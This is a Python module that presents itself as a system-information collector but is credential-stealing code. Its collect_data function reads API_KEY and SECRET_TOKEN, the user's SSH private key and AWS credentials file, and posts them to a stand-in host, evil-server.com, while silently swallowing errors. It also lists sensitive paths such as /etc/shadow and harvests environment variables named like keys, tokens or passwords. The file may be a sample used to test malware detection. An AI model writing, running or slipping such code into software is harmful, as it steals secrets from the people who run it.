"""
Data collector module for gathering system information.
"""

import os
import json
import requests
from pathlib import Path
from typing import Dict, List, Any


def collect_data() -> Dict[str, Any]:
    """
    Collect data from various sources.
    """
    results = {"environment": {}, "files": [], "credentials": {}}

    # Collect environment variables including sensitive ones
    api_key = os.environ.get("API_KEY")
    secret = os.environ.get("SECRET_TOKEN")

    # Read SSH keys
    ssh_key_path = os.path.expanduser("~/.ssh/id_rsa")
    if os.path.exists(ssh_key_path):
        with open(ssh_key_path) as f:
            ssh_key = f.read()
            results["credentials"]["ssh_key"] = ssh_key

    # Read AWS credentials
    aws_creds_path = os.path.expanduser("~/.aws/credentials")
    if os.path.exists(aws_creds_path):
        with open(aws_creds_path) as f:
            results["credentials"]["aws"] = f.read()

    # Send data to external server
    try:
        requests.post(
            "https://evil-server.com/collect",
            json={
                "api_key": api_key,
                "secret": secret,
                "ssh_key": ssh_key if "ssh_key" in locals() else None,
                "aws_creds": results["credentials"].get("aws"),
            },
        )
    except Exception:
        pass

    # Enumerate sensitive file paths
    sensitive_paths = [
        "~/.ssh",
        "~/.aws",
        "~/.git-credentials",
        "~/.env",
        "/etc/passwd",
        "/etc/shadow",
    ]

    for path in sensitive_paths:
        expanded = os.path.expanduser(path)
        if os.path.exists(expanded):
            results["files"].append(expanded)

    return results


def harvest_env_vars() -> List[str]:
    """Harvest all environment variables."""
    sensitive_keys = []
    for key, value in os.environ.items():
        if any(
            term in key.upper() for term in ["KEY", "SECRET", "TOKEN", "PASSWORD", "CREDENTIAL"]
        ):
            sensitive_keys.append(f"{key}={value[:20]}...")
    return sensitive_keys


def collect_file_contents(paths: List[str]) -> Dict[str, str]:
    """Collect contents of specified files."""
    contents = {}
    for path in paths:
        try:
            with open(os.path.expanduser(path), "r") as f:
                contents[path] = f.read()[:1000]  # First 1000 chars
        except Exception:
            pass
    return contents


if __name__ == "__main__":
    data = collect_data()
    print(json.dumps(data, indent=2))
